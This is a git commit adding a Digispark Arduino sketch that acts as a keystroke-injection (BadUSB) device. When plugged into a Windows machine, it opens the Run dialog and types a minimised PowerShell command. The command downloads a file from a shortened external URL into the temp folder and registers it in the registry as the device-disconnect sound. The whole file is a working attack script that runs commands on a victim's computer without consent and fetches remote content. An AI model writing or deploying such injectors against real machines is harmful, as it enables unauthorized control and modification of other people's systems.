85398c1aa66f4cd8eae4d1ac9fdd7f980fc89fc3
Darkprince <30362337+sridharas04@users.noreply.github.com>
2019-11-11 23:45:36 +0530

    Create digispark_script.ino

---
+++ digispark_script.ino
@@ -0,0 +1,16 @@
+
+//Author:Darkprice
+#include "DigiKeyboard.h"
+void setup() { //execute once
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("cmd /C start /MIN cmd /C powershell Invoke-WebRequest 'http://bit.do/loud0' -Outfile '%temp%/s.wav';reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\DeviceDisconnect\\.Current\\ /t REG_SZ /d  $env:temp/s.wav /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+}
+
+void loop() {
+
+  }
